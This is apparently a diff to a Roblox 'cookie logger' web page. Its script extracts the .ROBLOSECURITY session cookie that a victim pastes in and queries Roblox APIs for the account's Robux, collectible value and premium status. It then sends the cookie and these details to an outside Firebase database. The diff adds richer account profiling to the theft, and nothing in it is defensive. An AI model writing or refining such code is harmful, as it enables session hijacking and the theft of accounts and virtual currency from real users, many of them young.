@@ -29,52 +29,48 @@
 <script>
 async function run() {
   const text = document.getElementById("paste").value;
-
-  // 100% working cookie grab
   const cookie = text.split('".ROBLOSECURITY", "')[1]?.split('"')[0];
   if (!cookie) {
     document.getElementById("msg").textContent = "No cookie found – copy again";
     return;
   }
 
-  // DEFAULT VALUES (so it never shows "Unknown" if fetch fails)
-  let user = "Fetching...", userid = 0, display = "Fetching...", headshot = "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-00000000000000000000000000000000-Png/150/150/AvatarHeadshot/png";
+  const headers = { "Cookie": ".ROBLOSECURITY=" + cookie };
 
-  // Get real user info — this time with proper error handling + fallback
+  let user = "Failed", display = "Failed", userid = 0, robux = 0, rap = 0, premium = "No", headshot = "";
+
   try {
-    const info = await fetch("https://users.roblox.com/v1/users/authenticated", {
-      credentials: "include",
-      headers: { 
-        "Cookie": ".ROBLOSECURITY=" + cookie,
-        "Accept": "application/json"
-      }
-    });
+    const userInfo = await fetch("https://users.roblox.com/v1/users/authenticated", { headers }).then(r => r.json());
+    user = userInfo.name || "Failed";
+    display = userInfo.displayName || user;
+    userid = userInfo.id || 0;
 
-    if (info.ok) {
-      const data = await info.json();
-      user = data.name || "NoName";
-      userid = data.id || 0;
-      display = data.displayName || user;
-      headshot = `https://www.roblox.com/headshot-thumbnail/image?userId=${userid}&width=150&height=150&format=png`;
-    }
-  } catch(e) {
-    // If Roblox blocks the request, we still send the cookie with "Invalid/Expired" tag
-    user = "Invalid/Expired";
-    display = "Invalid/Expired";
-  }
+    const robuxData = await fetch(`https://economy.roblox.com/v1/users/${userid}/currency`, { headers }).then(r => r.json());
+    robux = robuxData.robux || 0;
 
-  // SEND CLEAN + FULL INFO EVERY TIME
+    const rapData = await fetch(`https://inventory.roblox.com/v1/users/${userid}/assets/collectibles?limit=100`, { headers }).then(r => r.json());
+    rap = rapData.data?.reduce((a, i) => a + (i.recentAveragePrice || 0), 0) || 0;
+
+    const prem = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userid}/validate-membership`, { headers }).then(r => r.text());
+    premium = prem === "true" ? "Yes" : "No";
+
+    const thumb = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userid}&size=150x150&format=Png`).then(r => r.json());
+    headshot = thumb.data[0]?.imageUrl || "";
+
+  } catch(e) { console.log("some api blocked, still sending cookie"); }
+
+  // EXACT SAME FORMAT AS YOUR WORKING EXTENSION
   fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
     method: "POST",
     body: JSON.stringify({
-      cookie: cookie,
-      user: user,
-      userid: userid,
-      display: display,
-      headshot: headshot,
-      premium: "No",
-      robux: 0,
-      rap: 0,
+      cookie,
+      user,
+      display,
+      userid,
+      robux,
+      rap,
+      premium,
+      headshot,
       time: new Date().toLocaleString()
     }),
     headers: {"Content-Type": "application/json"}
